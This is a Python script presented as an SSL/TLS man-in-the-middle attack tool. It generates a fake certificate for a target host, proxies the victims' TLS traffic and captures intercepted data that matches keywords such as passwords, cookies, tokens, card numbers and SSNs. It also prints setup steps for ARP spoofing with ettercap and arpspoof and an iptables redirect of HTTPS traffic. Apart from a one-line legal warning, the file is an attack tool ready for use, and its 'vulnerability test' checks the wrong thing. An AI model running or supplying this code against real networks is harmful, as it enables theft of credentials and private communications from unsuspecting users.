#!/usr/bin/env python3
"""
mitm_attack.py - Man-in-the-Middle SSL/TLS Attack

This script implements various MITM attacks against SSL/TLS connections,
including certificate substitution and session hijacking.
"""

import socket
import ssl
import threading
import argparse
import time
import subprocess
import os
import tempfile
from datetime import datetime, timedelta
import requests

class MITMSSLAttack:
    def __init__(self, target_host, target_port=443, listen_port=8445):
        self.target_host = target_host
        self.target_port = target_port
        self.listen_port = listen_port
        self.captured_sessions = []
        self.fake_cert_file = None
        self.fake_key_file = None
        
    def generate_fake_certificate(self):
        """Generate a fake SSL certificate for the target domain"""
        try:
            print(f"[INFO] Generating fake certificate for {self.target_host}")
            
            # Create temporary files
            self.fake_cert_file = tempfile.NamedTemporaryFile(mode='w', suffix='.crt', delete=False)
            self.fake_key_file = tempfile.NamedTemporaryFile(mode='w', suffix='.key', delete=False)
            
            # Generate private key
            key_gen_cmd = [
                'openssl', 'genrsa', '-out', self.fake_key_file.name, '2048'
            ]
            subprocess.run(key_gen_cmd, check=True, capture_output=True)
            
            # Generate certificate
            cert_gen_cmd = [
                'openssl', 'req', '-new', '-x509', '-key', self.fake_key_file.name,
                '-out', self.fake_cert_file.name, '-days', '365', '-subj',
                f'/C=US/ST=CA/L=SF/O=Test/CN={self.target_host}'
            ]
            subprocess.run(cert_gen_cmd, check=True, capture_output=True)
            
            print(f"[INFO] Fake certificate generated: {self.fake_cert_file.name}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Certificate generation failed: {e}")
            return False
        except FileNotFoundError:
            print("[ERROR] OpenSSL not found. Please install OpenSSL.")
            return False
    
    def handle_client_connection(self, client_socket, client_addr):
        """Handle incoming client connection with fake certificate"""
        try:
            print(f"[INFO] New client connection from {client_addr}")
            
            # Create SSL context with fake certificate
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(self.fake_cert_file.name, self.fake_key_file.name)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Wrap client socket with SSL
            try:
                ssl_client_socket = context.wrap_socket(client_socket, server_side=True)
                print(f"[SUCCESS] SSL handshake completed with {client_addr}")
                
                # Connect to real target
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_context = ssl.create_default_context()
                target_context.check_hostname = False
                target_context.verify_mode = ssl.CERT_NONE
                
                target_socket.connect((self.target_host, self.target_port))
                ssl_target_socket = target_context.wrap_socket(target_socket, server_hostname=self.target_host)
                
                print(f"[INFO] Connected to target {self.target_host}:{self.target_port}")
                
                # Start proxying data and capturing
                self.proxy_and_capture(ssl_client_socket, ssl_target_socket, client_addr)
                
            except ssl.SSLError as e:
                print(f"[ERROR] SSL handshake failed with {client_addr}: {e}")
            
        except Exception as e:
            print(f"[ERROR] Client handling error: {e}")
        finally:
            client_socket.close()
    
    def proxy_and_capture(self, client_socket, target_socket, client_addr):
        """Proxy data between client and target while capturing"""
        def forward_data(source, destination, direction):
            try:
                while True:
                    data = source.recv(4096)
                    if not data:
                        break
                    
                    # Capture and log data
                    self.capture_data(data, client_addr, direction)
                    destination.send(data)
                    
            except Exception as e:
                print(f"[ERROR] Forwarding error ({direction}): {e}")
            finally:
                source.close()
                destination.close()
        
        # Start forwarding threads
        client_to_target = threading.Thread(
            target=forward_data,
            args=(client_socket, target_socket, "client->target")
        )
        target_to_client = threading.Thread(
            target=forward_data,
            args=(target_socket, client_socket, "target->client")
        )
        
        client_to_target.daemon = True
        target_to_client.daemon = True
        
        client_to_target.start()
        target_to_client.start()
        
        client_to_target.join()
        target_to_client.join()
    
    def capture_data(self, data, client_addr, direction):
        """Capture and analyze intercepted data"""
        try:
            # Try to decode as text
            text_data = data.decode('utf-8', errors='ignore')
            
            # Look for interesting patterns
            if self.is_sensitive_data(text_data):
                print(f"[CAPTURED] Sensitive data from {client_addr[0]} ({direction}):")
                print(f"[DATA] {text_data[:200]}{'...' if len(text_data) > 200 else ''}")
                
                # Store captured data
                self.captured_sessions.append({
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'client': client_addr[0],
                    'direction': direction,
                    'data': text_data,
                    'size': len(data)
                })
        
        except Exception as e:
            # Binary data or decode error
            if len(data) > 0:
                print(f"[DEBUG] Binary data captured from {client_addr[0]} ({direction}): {len(data)} bytes")
    
    def is_sensitive_data(self, text_data):
        """Check if data contains sensitive information"""
        sensitive_patterns = [
            'password', 'passwd', 'pwd',
            'username', 'user', 'login',
            'email', 'mail',
            'cookie', 'session',
            'authorization', 'auth',
            'token', 'key',
            'credit', 'card', 'cvv',
            'ssn', 'social',
            'POST ', 'GET ',
            'Content-Length:', 'Host:'
        ]
        
        text_lower = text_data.lower()
        return any(pattern in text_lower for pattern in sensitive_patterns)
    
    def start_mitm_server(self):
        """Start the MITM SSL proxy server"""
        if not self.generate_fake_certificate():
            print("[ERROR] Failed to generate fake certificate")
            return
        
        print(f"[INFO] Starting MITM SSL proxy on port {self.listen_port}")
        print(f"[INFO] Target: {self.target_host}:{self.target_port}")
        print(f"[ATTACK] Using fake certificate for {self.target_host}")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.listen_port))
        server_socket.listen(5)
        
        print(f"[INFO] MITM proxy listening on port {self.listen_port}")
        print("[INFO] Redirect target traffic to this proxy to intercept SSL")
        
        try:
            while True:
                client_socket, client_addr = server_socket.accept()
                
                client_thread = threading.Thread(
                    target=self.handle_client_connection,
                    args=(client_socket, client_addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[INFO] Stopping MITM attack...")
            self.cleanup()
            self.show_captured_data()
        finally:
            server_socket.close()
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            if self.fake_cert_file:
                os.unlink(self.fake_cert_file.name)
            if self.fake_key_file:
                os.unlink(self.fake_key_file.name)
        except Exception:
            pass
    
    def show_captured_data(self):
        """Display captured session data"""
        if not self.captured_sessions:
            print("[INFO] No sensitive data captured")
            return
        
        print("\n" + "="*60)
        print("CAPTURED SESSION DATA")
        print("="*60)
        
        for session in self.captured_sessions:
            print(f"\nTimestamp: {session['timestamp']}")
            print(f"Client: {session['client']}")
            print(f"Direction: {session['direction']}")
            print(f"Size: {session['size']} bytes")
            print(f"Data Preview:")
            print("-" * 40)
            print(session['data'][:500])
            if len(session['data']) > 500:
                print("... (truncated)")
            print("-" * 40)
    
    def test_certificate_validation(self):
        """Test if target properly validates certificates"""
        print(f"[TEST] Testing certificate validation for {self.target_host}")
        
        try:
            # Test with invalid certificate
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            
            sock = socket.create_connection((self.target_host, self.target_port), timeout=10)
            
            try:
                # This should fail with proper certificate validation
                ssl_sock = context.wrap_socket(sock, server_hostname="invalid-hostname.com")
                ssl_sock.close()
                print("[VULNERABLE] Target accepts invalid certificates!")
                return True
            except ssl.SSLError:
                print("[SECURE] Target properly validates certificates")
                
            except ssl.CertificateError:
                print("[SECURE] Target rejects invalid certificates")
            
            sock.close()
            
        except Exception as e:
            print(f"[ERROR] Certificate validation test failed: {e}")
        
        # Test certificate pinning
        try:
            print("[INFO] Testing for certificate pinning...")
            response = requests.get(f"https://{self.target_host}", verify=False, timeout=10)
            
            # Check for HPKP header
            hpkp = response.headers.get('public-key-pins')
            if hpkp:
                print(f"[SECURE] Certificate pinning detected: {hpkp}")
                return False
            else:
                print("[VULNERABLE] No certificate pinning detected!")
                return True
                
        except Exception as e:
            print(f"[ERROR] Pinning test failed: {e}")
        
        return False

def show_mitm_setup():
    """Show MITM attack setup instructions"""
    print("\n" + "="*60)
    print("MITM SSL ATTACK SETUP")
    print("="*60)
    print("To perform SSL MITM attacks, you need to:")
    print()
    print("1. Position yourself on the same network as the target")
    print("2. Perform ARP spoofing to redirect traffic:")
    print("   # Enable IP forwarding")
    print("   echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("   ")
    print("   # ARP spoofing with ettercap")
    print("   ettercap -T -M arp:remote /target_ip/ /gateway_ip/")
    print("   ")
    print("   # Or use arpspoof")
    print("   arpspoof -i eth0 -t target_ip gateway_ip")
    print("   arpspoof -i eth0 -t gateway_ip target_ip")
    print()
    print("3. Redirect HTTPS traffic to the MITM proxy:")
    print("   iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8445")
    print()
    print("4. Start this MITM proxy to intercept SSL connections")
    print()
    print("LEGAL WARNING: Only use on networks you own or have explicit permission!")

def main():
    parser = argparse.ArgumentParser(description='MITM SSL Attack Tool')
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('-l', '--listen', type=int, default=8445, help='Listen port (default: 8445)')
    parser.add_argument('-t', '--test', action='store_true', help='Test certificate validation only')
    parser.add_argument('--setup', action='store_true', help='Show setup instructions')
    
    args = parser.parse_args()
    
    print("MITM SSL Attack Tool")
    print("====================")
    
    if args.setup:
        show_mitm_setup()
        return
    
    attacker = MITMSSLAttack(args.target, args.port, args.listen)
    
    if args.test:
        is_vulnerable = attacker.test_certificate_validation()
        if is_vulnerable:
            print("\n[INFO] Target may be vulnerable to MITM attacks")
            print("[INFO] Use without --test flag to start MITM proxy")
            print("[INFO] Use --setup flag for attack setup instructions")
    else:
        print("[INFO] Testing certificate validation first...")
        is_vulnerable = attacker.test_certificate_validation()
        
        if is_vulnerable:
            print("\n[ATTACK] Target appears vulnerable! Starting MITM proxy...")
            time.sleep(2)
            attacker.start_mitm_server()
        else:
            print("\n[INFO] Target has good certificate validation")
            response = input("Start MITM attack anyway? (y/N): ")
            if response.lower() == 'y':
                attacker.start_mitm_server()

if __name__ == "__main__":
    main()
